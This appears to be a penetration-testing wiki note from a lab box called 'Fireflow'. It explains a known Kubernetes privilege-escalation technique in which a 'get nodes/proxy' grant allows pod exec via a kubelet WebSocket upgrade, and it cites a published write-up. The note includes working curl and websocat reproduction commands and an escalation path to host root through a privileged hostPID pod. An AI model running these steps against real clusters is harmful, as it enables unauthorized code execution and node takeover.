# Kubernetes `get nodes/proxy` → Kubelet Exec via WebSocket-Upgrade RBAC Bypass

A narrow-looking Kubernetes RBAC grant (`get` verb only, `nodes/proxy`
resource) that in practice authorizes far more than "read node metadata" —
up to and including a full interactive `exec` inside any pod on that node.
This is a documented technique class (see Graham Helton's write-up below),
not something unique to one box, and is worth checking any time a
ServiceAccount's actual permission set includes `nodes/proxy` in any form.

## Why `nodes/proxy` is dangerous even scoped to `get`

`nodes/proxy` is the resource that gates *any* direct HTTP call routed
through a node object to that node's kubelet HTTPS API (default port
10250) — `/pods`, `/stats/summary`, `/metrics`, `/exec/...`, `/run/...`,
`/portForward/...` are all, from the API server's authorization
perspective, the same resource. What differs between them is only the
**HTTP method** used to reach them, and kubelet's Node authorizer derives
the RBAC **verb** purely from that method:

| HTTP method | Inferred verb |
|---|---|
| GET | `get` |
| POST | `create` |

Read-style calls (`GET /pods`, `GET /stats/summary`) are naturally GET, so
`get nodes/proxy` alone is enough to dump the full `PodList` scheduled on
that node — full specs, volumes, env vars, security contexts, no separate
`pods` RBAC rule consulted at all, since the whole thing is proxied through
the already-authorized node resource.

## The exec bypass specifically

`kubectl exec` (and the SPDY-based `client-go` remotecommand transport
behind it) opens its `/exec/<ns>/<pod>/<container>` connection via an HTTP
**POST**-based protocol upgrade — so a token with only `get nodes/proxy`
correctly gets denied:

```
Forbidden (user=..., verb=create, resource=nodes, subresource(s)=[proxy])
```

But kubelet's `remotecommand` handler *also* accepts a newer transport:
exec over **WebSocket** (sub-protocol `v4.channel.k8s.io`). Per RFC 6455,
every WebSocket connection — regardless of what happens after the upgrade —
starts as a plain HTTP **GET** request with `Connection: Upgrade` and
`Upgrade: websocket` headers. The Node authorizer's HTTP-method-to-verb
mapping has no special case for this: it sees a GET to the exact same
`/exec/...` path and authorizes it as `get nodes/proxy`, which the token
already has. The distinction between "a GET that reads something" and "a
GET that is the handshake for an arbitrarily long, fully interactive,
bidirectional command session" is invisible to a verb-inference scheme
based solely on the initiating HTTP method.

Diagnostic signal that you're hitting this gap rather than a hard deny:
requesting `/exec/...` with `curl -X GET` plus the WebSocket upgrade
headers (no real WebSocket library needed just to test authorization)
returns something other than `Forbidden` — typically an application-level
error like `Upgrade request required` (since curl doesn't complete the
actual handshake), which proves the request passed the authorization layer
and only failed at the protocol layer.

## Minimal reproduction

```bash
# 1. Confirm the actual grant with the token in hand, don't infer from a Role's name:
curl -sk -X POST https://<apiserver>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 2. Confirm create is denied but get passes through to the protocol layer:
curl -sk -X POST "https://<node-ip>:10250/exec/<ns>/<pod>/<container>?command=id" -H "Authorization: Bearer $TOK"
# -> Forbidden ... verb=create
curl -sk -X GET  "https://<node-ip>:10250/exec/<ns>/<pod>/<container>?command=id&input=1&output=1&tty=1" \
  -H "Authorization: Bearer $TOK" -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="  # gitleaks:allow -- RFC 6455's own published example nonce, not a real key
# -> "Upgrade request required" (HTTP 500) -- NOT Forbidden

# 3. Complete the handshake for real with a WebSocket-capable client (websocat, or a
#    minimal stdlib client if no external tooling is available inside a constrained
#    execution environment -- see kubelet_ws_exec.py):
websocat --insecure --header "Authorization: Bearer $TOK" \
  --protocol v4.channel.k8s.io \
  "wss://<node-ip>:10250/exec/<ns>/<pod>/<container>?output=1&error=1&command=id"
```

`Tooling and Scripts/exploits/Fireflow/kubelet_ws_exec.py` is a
stdlib-only (no `websocat`/`websockets` package required) implementation of
step 3 — useful when the only execution primitive available is inside an
already-compromised, minimally-provisioned container (e.g. reachable only
via a raw `python3 -c "..."` RCE oracle with no package installs
possible). It hand-implements the RFC 6455 handshake (`Sec-WebSocket-Key`
computation, reading past the `101 Switching Protocols` response) and
frame parsing (unmasked server→client frames, demultiplexed by the first
payload byte per the `v4.channel.k8s.io` channel convention: `0`=stdin,
`1`=stdout, `2`=stderr, `3`=the exec result/error-status channel — the
same channel numbering the SPDY transport also uses).

## Why this matters beyond exec specifically

Landing a shell inside *some* pod via this bypass is only as valuable as
what that pod can reach. Pair this technique with hunting the `PodList`
(itself readable via the same `get nodes/proxy` grant, no exec needed) for
a **privileged, `hostPID: true`** pod with a host `/` bind mount —
`prometheus-node-exporter`'s stock Helm chart defaults are a common,
easy-to-overlook instance of exactly this shape. Landing exec inside such
a pod is equivalent to host root via `/proc/1/root` (host PID 1 is visible
because of `hostPID`, and `privileged` bypasses the DAC/capability checks
that would otherwise restrict reads through it, independent of any
`readOnly: true` on an explicit, separate bind mount).

## Source

[Graham Helton — "Kubernetes Remote Code Execution Via Nodes/Proxy GET
Permission"](https://grahamhelton.com/blog/nodes-proxy-rce) documents this
exact bypass class independently. [[Fireflow#Privesc|Fireflow]]'s own
discovery of it was arrived at through direct empirical testing against
the live target's own authorization responses (a `SelfSubjectRulesReview`
call plus the GET-vs-POST `/exec/` probing above), not by consulting that
write-up first — noted here for the reader's own benefit that this is a
known, previously-published technique class, not a novel finding specific
to that box.

## Seen on

- [[Fireflow#Privesc|Fireflow]] — `mcp-sa` ServiceAccount token scoped to
  `get nodes/proxy` only, used to dump the node's `PodList`, find a
  privileged `node-exporter` DaemonSet pod, then exec inside it via this
  WebSocket bypass for full host root through `/proc/1/root`.
